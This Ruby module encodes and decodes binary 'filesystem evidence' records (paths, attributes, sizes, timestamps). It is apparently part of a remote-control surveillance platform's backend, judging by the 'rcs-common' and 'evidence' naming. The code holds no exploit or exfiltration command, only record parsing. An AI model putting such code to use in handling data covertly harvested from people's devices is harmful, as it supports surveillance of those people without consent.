require 'rcs-common/evidence/common'

module RCS

module FilesystemEvidence

  FILESYSTEM_VERSION = 2010031501
  FILESYSTEM_IS_FILE      = 0
	FILESYSTEM_IS_DIRECTORY = 1
	FILESYSTEM_IS_EMPTY     = 2

  def content(*args)
    sequence = if args.empty?
      [{path: '/', attr: 1}, {path: '/usr', attr: 1}, {path: '/usr/README', attr: 0, size: 12}]
    else
      [args].flatten
    end

    content = StringIO.new

    sequence.each do |data|
      path = data[:path].gsub("//", "/").to_utf16le_binary_null
      content.write [FILESYSTEM_VERSION, path.bytesize, data[:attr], (data[:size] || 0), 0].pack("I*")
      time = Time.now.getutc.to_filetime
      time.reverse!
      content.write time.pack('L*')
      content.write path
    end

    content.string
  end

  def generate_content(*args)
    [content(*args)]
  end

  def decode_content(common_info, chunks)
    stream = StringIO.new chunks.join

    entries = []

    until stream.eof?
      version, path_len, attribute, size_lo, size_hi = stream.read(20).unpack("L*")
      raise EvidenceDeserializeError.new("invalid log version for FILESYSTEM [#{version} != #{FILESYSTEM_VERSION}]") unless version == FILESYSTEM_VERSION

      entry = {}
      entry[:size] = Float((size_hi << 32) | size_lo)
      entry[:attr] = attribute
      low_time, high_time = *stream.read(8).unpack('L*')
      entry[:da] = Time.from_filetime(high_time, low_time)

      path = stream.read(path_len).terminate_utf16le

      if path
        entry[:path] = path.utf16le_to_utf8.gsub("\\\\", "\\")
        entries << entry
      end
    end

    if block_given? and entries.any?
      info = Hash[common_info]
      info[:data] ||= Hash.new
      info[:data][:entries] = entries

      yield(info)
    end

    :delete_raw
  end
end

end # ::RCS